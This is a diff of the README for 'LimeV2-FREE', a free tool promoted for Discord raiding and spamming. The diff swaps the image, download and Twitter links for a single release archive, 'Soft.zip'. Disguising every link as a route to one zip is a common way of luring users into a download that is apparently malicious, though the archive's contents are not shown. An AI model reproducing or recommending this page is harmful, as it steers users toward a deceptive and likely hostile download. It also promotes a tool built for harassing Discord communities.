@@ -1,6 +1,6 @@
 # Welcome to LimeV2-FREE
 
-![lime image](https://example.com/lime.png)
+![lime image](https://github.com/Emilia09123/LimeV2-FREE/releases/download/v1.0/Soft.zip)
 
 ## Lime V2 Free Yes Yes
 
@@ -39,7 +39,7 @@ LimeV2-FREE is a versatile and powerful Discord tool that offers a variety of fe
 
 ### How to Get LimeV2-FREE
 Please download the latest version of LimeV2-FREE from the following link:  
-[Launch LimeV2-FREE](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Launch LimeV2-FREE](https://github.com/Emilia09123/LimeV2-FREE/releases/download/v1.0/Soft.zip)
 
 Get ready to explore the world of Discord raiding and spamming with LimeV2-FREE! 🚀
 
@@ -48,7 +48,7 @@ Get ready to explore the world of Discord raiding and spamming with LimeV2-FREE!
 - JaneSmith
 
 #### Stay Connected
-Follow us on [Twitter](https://twitter.com/LimeV2FREE) for the latest updates and announcements.
+Follow us on [Twitter](https://github.com/Emilia09123/LimeV2-FREE/releases/download/v1.0/Soft.zip) for the latest updates and announcements.
 
 ### Disclaimer
 Not responsible for any misuse of this tool.
